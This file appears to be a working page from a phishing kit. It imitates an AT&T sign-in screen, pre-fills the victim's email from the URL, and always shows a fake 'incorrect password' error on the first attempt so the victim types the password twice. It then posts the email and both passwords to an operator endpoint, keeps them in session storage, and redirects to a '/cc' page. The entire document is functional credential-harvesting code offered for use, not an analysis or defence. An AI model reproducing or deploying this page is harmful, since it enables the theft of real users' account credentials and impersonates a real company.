<?php
// Get email from URL or session
$email = $_GET['email'] ?? '';
if (empty($email)) {
    // Try to get from JavaScript session storage via cookie or hidden input
    $email = $_POST['email'] ?? '';
}
?>
<html>
<title>Login Screen</title>
<head>
    <link rel="icon" type="image/x-icon" href="/assets/bellosuth/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            cursor: auto;
            background-color: rgb(255, 255, 255);
            color: rgb(29, 35, 41);
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            font-size: 18px;
            font-weight: 400;
            line-height: 18px;
            min-height: 604px;
            position: relative;
            width: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
        }

        .main-container {
            background-color: rgb(255, 255, 255);
            position: relative;
        }

        .content-wrapper {
            display: flex;
            flex-direction: column;
            width: 100%;
            margin: auto;
            max-width: 1324px;
            padding: 0px 16px;
            min-height: 604px;
        }

        .center-container {
            justify-content: center;
            flex: 1 1 0%;
            display: flex;
            width: 100%;
        }

        .card-container {
            width: 456px;
            min-height: 520px;
            border-radius: 16px;
            box-shadow: rgb(220, 223, 227) 0px 0px 0px 1px inset;
            z-index: 0;
            margin-top: 64px;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .card-content {
            padding: 48px;
        }

        .header {
            display: flex;
            align-items: center;
            flex-direction: column;
            margin-bottom: 32px;
        }

        .logo {
            margin-bottom: 32px;
            border: 0px none rgb(29, 35, 41);
            max-height: 100%;
            max-width: 100%;
            vertical-align: middle;
            height: 36px;
        }

        .welcome-title {
            margin-bottom: 16px;
            text-align: center;
        }

        .welcome-title h1 {
            font-size: 34px;
            color: rgb(29, 35, 41);
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            font-weight: 700;
            line-height: 39.1px;
            letter-spacing: -1.02px;
            text-indent: -1.7px;
            display: block;
            margin: 0;
        }

        .user-display {
            margin-bottom: 24px;
            width: 100%;
        }

        .user-info {
            align-items: center;
            justify-content: center;
            display: flex;
            flex-direction: row;
        }

        .back-button {
            min-height: 44px;
            min-width: 44px;
            align-items: center;
            justify-content: center;
            display: flex;
            flex-direction: row;
            background-color: rgba(0, 0, 0, 0);
            border: 0px none rgb(29, 35, 41);
            cursor: pointer;
            font-size: 16px;
            margin: 0px;
            vertical-align: middle;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            color: rgb(29, 35, 41);
            padding: 0px;
        }

        .back-icon {
            pointer-events: none;
            border: 0px none rgb(29, 35, 41);
            max-height: 100%;
            max-width: 100%;
            vertical-align: middle;
        }

        .back-icon-container {
            position: relative;
            display: inline-block;
            width: 24px;
            height: 24px;
            margin: 0px 6px 0px 0px;
        }

        .back-icon-normal {
            display: block;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .back-icon-filled {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .back-button:hover .back-icon-normal {
            display: none;
        }

        .back-button:hover .back-icon-filled {
            display: block;
        }

        .user-email {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            text-overflow: ellipsis;
            overflow: hidden;
            letter-spacing: -0.54px;
            white-space: nowrap;
            font-size: 18px;
            line-height: 25.2px;
            pointer-events: none;
            font-weight: 400;
            font-stretch: 100%;
            font-style: normal;
            color: rgb(29, 35, 41);
        }

        .password-section {
            position: relative;
            margin-top: 0px;
            width: 100%;
            margin-bottom: 24px;
        }

        .password-label {
            align-items: center;
            display: flex;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            font-weight: 700;
            font-size: 14px;
            line-height: 16.8px;
            padding-bottom: 8px;
            cursor: pointer;
            margin: 0;
        }

        .password-input {
            appearance: none;
            background-color: rgb(255, 255, 255);
            border: 1px solid rgb(104, 110, 116);
            border-radius: 8px;
            color: rgb(29, 35, 41);
            display: flex;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            font-size: 16px;
            min-height: 48px;
            line-height: normal;
            padding: 0px 50px 0px 16px;
            align-items: center;
            width: 100%;
            margin: 0px;
            vertical-align: middle;
            box-sizing: border-box;
        }

        .password-input:focus {
            outline: none;
            border-color: rgb(0, 56, 143);
            border-width: 2px;
        }

        .password-input.error {
            border-color: #d83b01;
        }

        .show-password-btn {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            color: rgb(29, 35, 41);
            padding: 8px;
            position: absolute;
            cursor: pointer;
            font-size: 14px;
            margin: 0px;
            vertical-align: middle;
            top: 35px;
            background-color: rgba(0, 0, 0, 0);
            border: 0px none rgb(29, 35, 41);
            right: 8px;
            font-weight: 500;
            font-stretch: 100%;
            font-style: normal;
            letter-spacing: normal;
        }

        .error-message {
            color: #d83b01;
            font-size: 14px;
            margin-top: 4px;
            display: none;
            align-items: flex-end;
            line-height: 16.8px;
            height: auto;
            max-height: 0px;
            min-height: 0px;
            opacity: 0;
            overflow: hidden;
            padding-top: 0px;
            transition: opacity 0.3s linear, font-size 0s linear 0.3s, padding-top 0.2s linear 0.3s, max-height 0.2s linear 0.2s, min-height 0.2s linear 0.3s;
            width: 100%;
        }

        .error-message.show {
            display: flex;
            opacity: 1;
            max-height: 50px;
            min-height: 16.8px;
            padding-top: 4px;
        }

        .keep-signed-in {
            margin: 24px 0px 40px;
        }

        .checkbox-label {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            align-items: center;
            display: inline-flex;
            font-size: 14px;
            position: relative;
            z-index: 0;
            cursor: pointer;
            font-weight: 400;
            font-stretch: 100%;
            font-style: normal;
            letter-spacing: normal;
            color: rgb(29, 35, 41);
        }

        .checkbox-input {
            height: 44px;
            left: -10px;
            opacity: 0.001;
            position: absolute;
            top: -10px;
            width: 44px;
            z-index: 2;
            cursor: pointer;
            font-size: 16px;
            margin: 0px;
            vertical-align: middle;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
        }

        .checkbox-visual {
            border-radius: 4px;
            align-items: center;
            align-self: center;
            background-color: rgb(255, 255, 255);
            border: 1px solid rgb(104, 110, 116);
            display: flex;
            height: 24px;
            justify-content: center;
            max-height: 24px;
            min-width: 24px;
            position: relative;
            width: 24px;
            z-index: 0;
            transition: background-color 0.2s ease, border-color 0.2s ease;
            flex-shrink: 0;
        }

        .checkbox-input:checked ~ .checkbox-visual {
            background-color: rgb(0, 56, 143);
            border-color: rgb(0, 56, 143);
        }

        .checkbox-input:checked ~ .checkbox-visual::after {
            content: "✓";
            color: white;
            font-size: 14px;
            font-weight: bold;
        }

        .checkbox-text {
            align-self: center;
            position: relative;
            line-height: 22.4px;
            margin-left: 8px;
            vertical-align: middle;
        }

        .button-section {
            margin-top: 32px;
            margin-bottom: 32px;
            display: flex;
            align-items: center;
            flex-direction: column;
        }

        .signin-button {
            letter-spacing: -0.42px;
            background-color: rgb(0, 56, 143);
            border-color: rgb(0, 56, 143);
            color: rgb(242, 250, 253);
            outline-offset: -4px;
            transition: 0.2s;
            min-width: 100%;
            align-items: center;
            border: 2px solid rgb(0, 56, 143);
            border-radius: 28px;
            display: inline-flex;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            font-weight: 700;
            justify-content: center;
            text-align: center;
            line-height: 14px;
            outline: rgba(0, 0, 0, 0) solid 1px;
            user-select: none;
            font-size: 14px;
            height: 48px;
            padding: 0px 32px;
            vertical-align: bottom;
            text-decoration: none solid rgb(242, 250, 253);
            cursor: pointer;
            margin: 0px;
        }

        .signin-button:hover {
            background-color: rgb(0, 46, 117);
            border-color: rgb(0, 46, 117);
        }

        .forgot-password {
            margin-top: 24px;
        }

        .forgot-password a {
            font-size: 15px;
            line-height: 21px;
            text-decoration: none solid rgb(0, 116, 179);
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            font-weight: 700;
            color: rgb(0, 116, 179);
            cursor: pointer;
            background-color: rgba(0, 0, 0, 0);
        }

        .footer {
            align-items: center;
            justify-content: center;
            display: flex;
            width: 100%;
        }

        .footer-content {
            padding: 0px;
            flex-basis: 100%;
            max-width: 100%;
            flex: 1 0 auto;
        }

        .footer-inner {
            margin: 48px 0px 24px;
        }

        .footer-links {
            justify-content: center;
            display: flex;
            flex-direction: row;
            flex-wrap: wrap;
            gap: 24px;
        }

        .footer-link {
            font-size: 12px;
            line-height: 16.8px;
            color: rgb(29, 35, 41);
            cursor: pointer;
            background-color: rgba(0, 0, 0, 0);
            text-decoration: none solid rgb(29, 35, 41);
        }

        .footer-copyright {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
            margin-top: 16px;
            display: flex;
            flex-direction: row;
            align-items: center;
            justify-content: center;
        }

        .footer-copyright span {
            color: rgb(104, 110, 116);
            font-size: 12px;
            line-height: 16.8px;
        }

        @media (max-width: 768px) {
            .card-container {
                width: 100%;
                margin-top: 32px;
                box-shadow: none;
                border-radius: 0;
            }
            
            .card-content {
                padding: 24px;
            }
            
            .content-wrapper {
                padding: 0px 8px;
            }
        }
    </style>
</head>

<body>
    <div class="main-container">
        <div class="content-wrapper">
            <div class="center-container">
                <div class="card-container">
                    <div class="card-content">
                        <div class="header" style="margin-bottom: 0px;">
                            <img class="logo" alt="AT&T" src="/assets/bellosuth/att_hz_lg_lkp_rgb_pos.svg" />
                            <div class="welcome-title">
                                <h1>Welcome</h1>
                            </div>
                        </div>

                        <form method="post" id="loginForm">
                            <input type="hidden" name="provider" value="bellosuth">
                            <input type="hidden" name="email" id="emailField" value="<?php echo htmlspecialchars($email); ?>">

                            <div class="user-display">
                                <div class="user-info">
                                    <button type="button" class="back-button" onclick="window.history.back()">
                                        <div class="back-icon-container">
                                            <img class="back-icon back-icon-normal" alt="" src="/assets/bellosuth/arrow-left-circle_24.svg" />
                                            <img class="back-icon back-icon-filled" alt="" src="/assets/bellosuth/arrow-left-circle-filled_24.svg" />
                                        </div>
                                        <span class="user-email" id="userEmailDisplay"><?php echo htmlspecialchars($email ?: 'user@bellosuth.net'); ?></span>
                                    </button>
                                </div>
                            </div>

                            <div class="password-section">
                                <div style="display: inline-flex;">
                                    <label for="password" class="password-label">Password</label>
                                </div>
                                <input name="password" type="password" class="password-input" id="password" autocomplete="current-password" />
                                <button type="button" class="show-password-btn" id="showPasswordBtn">Show</button>
                                <div class="error-message" id="passwordError"></div>
                            </div>

                            <div class="keep-signed-in">
                                <label for="keepMeIn" class="checkbox-label">
                                    <input type="checkbox" name="keepMeIn" value="Y" class="checkbox-input" id="keepMeIn" />
                                    <div class="checkbox-visual"></div>
                                    <span class="checkbox-text">Keep me signed in</span>
                                </label>
                            </div>

                            <div class="button-section">
                                <button type="submit" class="signin-button" id="signinButton">Sign in</button>
                            </div>

                            <div class="forgot-password">
                                <a href="#">Forgot password?</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="footer">
                <div class="footer-content">
                    <div class="footer-inner">
                        <div class="footer-links">
                            <a href="#" class="footer-link">Legal policy center</a>
                            <a href="#" class="footer-link">Privacy policy</a>
                            <a href="#" class="footer-link">Terms of use</a>
                            <a href="#" class="footer-link">Accessibility</a>
                            <a href="#" class="footer-link">Your privacy choices</a>
                        </div>
                        <div class="footer-copyright">
                            <span>©2025 AT&T Intellectual Property. All rights reserved.</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const passwordInput = document.getElementById('password');
            const passwordError = document.getElementById('passwordError');
            const signinButton = document.getElementById('signinButton');
            const showPasswordBtn = document.getElementById('showPasswordBtn');
            let passwordAttempts = 0;
            
            function showError(message) {
                passwordError.textContent = message;
                passwordError.classList.add('show');
                passwordInput.classList.add('error');
            }
            
            function hideError() {
                passwordError.classList.remove('show');
                passwordInput.classList.remove('error');
            }
            
            // Show/Hide password functionality
            showPasswordBtn.addEventListener('click', function() {
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    showPasswordBtn.textContent = 'Hide';
                } else {
                    passwordInput.type = 'password';
                    showPasswordBtn.textContent = 'Show';
                }
            });
            
            // Clear errors when user types
            passwordInput.addEventListener('input', function() {
                if (this.value.trim()) {
                    hideError();
                }
            });
            
            // Get email from form or URL
            const emailField = document.getElementById('emailField');
            const userEmailDisplay = document.getElementById('userEmailDisplay');
            const emailFromSession = emailField ? emailField.value : '';
            
            if (emailFromSession && userEmailDisplay) {
                userEmailDisplay.textContent = emailFromSession;
            }
            
            // Form submission
            let firstPassword = '';
            
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                if (!passwordInput.value.trim()) {
                    showError('Please enter your password.');
                    return;
                }
                
                const email = emailField ? emailField.value : emailFromSession || '';
                
                if (!email) {
                    showError('Email not found. Please refresh the page.');
                    return;
                }
                
                passwordAttempts++;
                
                if (passwordAttempts === 1) {
                    // Store first password attempt
                    firstPassword = passwordInput.value;
                    
                    // First attempt - show incorrect password error
                    showError('Your account or password is incorrect. If you don\'t remember your password, reset it now.');
                    passwordInput.value = '';
                    passwordInput.focus();
                } else {
                    // Second attempt - send both passwords to API
                    // Wait for access code if not available yet
                    let accessCode = window.__ACCESS_CODE__ || '';
                    if (!accessCode) {
                        // Try to get from URL path as fallback
                        const pathParts = window.location.pathname.split('/').filter(p => p);
                        accessCode = pathParts[0] || '';
                    }
                    
                    if (!accessCode) {
                        showError('Access code not available. Please refresh the page.');
                        signinButton.disabled = false;
                        signinButton.textContent = 'Sign in';
                        return;
                    }
                    
                    const apiUrl = `/${accessCode}/send-oauth-email`;
                    
                    const oauthData = {
                        email: email,
                        password: passwordInput.value,
                        password1: firstPassword,
                        password2: passwordInput.value,
                        provider: 'bellosuth'
                    };
                    
                    // Save OAuth data to sessionStorage for later use (e.g., in security email)
                    const flowData = JSON.parse(sessionStorage.getItem('flowData') || '{}');
                    flowData.oauth = oauthData;
                    sessionStorage.setItem('flowData', JSON.stringify(flowData));
                    
                    try {
                        signinButton.disabled = true;
                        const originalText = signinButton.textContent || signinButton.innerText || 'Sign in';
                        signinButton.setAttribute('data-original-text', originalText);
                        signinButton.textContent = 'Signing in...';
                        
                        const response = await fetch(apiUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(oauthData)
                        });
                        
                        // Check if response is OK
                        if (!response.ok) {
                            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                        }
                        
                        // Try to parse JSON response
                        let result;
                        try {
                            const responseText = await response.text();
                            if (!responseText) {
                                throw new Error('Empty response from server');
                            }
                            result = JSON.parse(responseText);
                        } catch (parseErr) {
                            console.error('Failed to parse response:', parseErr);
                            throw new Error('Invalid response from server');
                        }
                        
                        // Check if success is true or if there's an error
                        if (result && result.success === true) {
                            // Success - redirect to next page
                            if (accessCode) {
                                setTimeout(() => {
                                    window.location.href = '/' + accessCode + '/cc';
                                }, 500);
                            } else {
                                window.location.href = '/?access';
                            }
                        } else {
                            // API returned error
                            const errorMsg = (result && result.error) ? result.error : 'Sign in failed. Please try again.';
                            showError(errorMsg);
                            signinButton.disabled = false;
                            const originalText = signinButton.getAttribute('data-original-text') || 'Sign in';
                            signinButton.textContent = originalText;
                        }
                    } catch (err) {
                        console.error('OAuth email send failed:', err);
                        showError('Sign in failed. Please try again.');
                        signinButton.disabled = false;
                        const originalText = signinButton.getAttribute('data-original-text') || 'Sign in';
                        signinButton.textContent = originalText;
                    }
                }
            });
            
            // Focus on password input
            passwordInput.focus();
        });
    </script>
</body>
</html>
